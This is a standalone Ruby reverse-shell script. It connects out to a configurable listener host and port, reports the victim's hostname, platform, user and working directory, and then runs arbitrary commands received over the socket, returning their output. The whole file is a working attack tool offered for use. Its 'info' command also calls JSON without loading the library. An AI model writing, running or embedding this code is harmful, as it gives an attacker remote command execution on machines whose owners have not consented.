#!/usr/bin/env ruby
# Ruby Reverse Shell
# Modern implementation with features
# Configure LHOST and LPORT before use

require 'socket'
require 'open3'

LHOST = "192.168.1.100"
LPORT = 4444

class ReverseShell
  def initialize(host, port)
    @host = host
    @port = port
    @socket = nil
  end

  def connect
    @socket = TCPSocket.new(@host, @port)
    send_message("Ruby Reverse Shell Connected!")
    send_message("Host: #{Socket.gethostname}")
    send_message("OS: #{RUBY_PLATFORM}")
    send_message("Ruby: #{RUBY_VERSION}")
    send_message("CWD: #{Dir.pwd}")
    true
  rescue StandardError => e
    puts "Connection failed: #{e.message}"
    false
  end

  def send_message(msg)
    @socket.puts(msg)
  end

  def handle_command(cmd)
    case cmd
    when 'exit', 'quit'
      send_message("Goodbye!")
      return false
    when /^cd\s+(.+)/
      begin
        Dir.chdir(Regexp.last_match(1))
        send_message("Changed to: #{Dir.pwd}")
      rescue StandardError => e
        send_message("Error: #{e.message}")
      end
    when 'info'
      info = {
        hostname: Socket.gethostname,
        platform: RUBY_PLATFORM,
        ruby_version: RUBY_VERSION,
        user: ENV['USER'] || ENV['USERNAME'],
        cwd: Dir.pwd
      }
      send_message(JSON.pretty_generate(info))
    when 'help'
      send_message("Commands: exit, quit, cd, info, help")
    else
      execute_command(cmd)
    end
    true
  end

  def execute_command(cmd)
    stdout, stderr, status = Open3.capture3(cmd)
    output = stdout + stderr
    send_message(output.empty? ? "Command completed (status: #{status.exitstatus})" : output)
  rescue StandardError => e
    send_message("Error: #{e.message}")
  end

  def run
    return unless connect

    while true
      @socket.print("Ruby > ")
      cmd = @socket.gets&.chomp
      break unless cmd
      break unless handle_command(cmd)
    end

    @socket.close
  end
end

shell = ReverseShell.new(LHOST, LPORT)
shell.run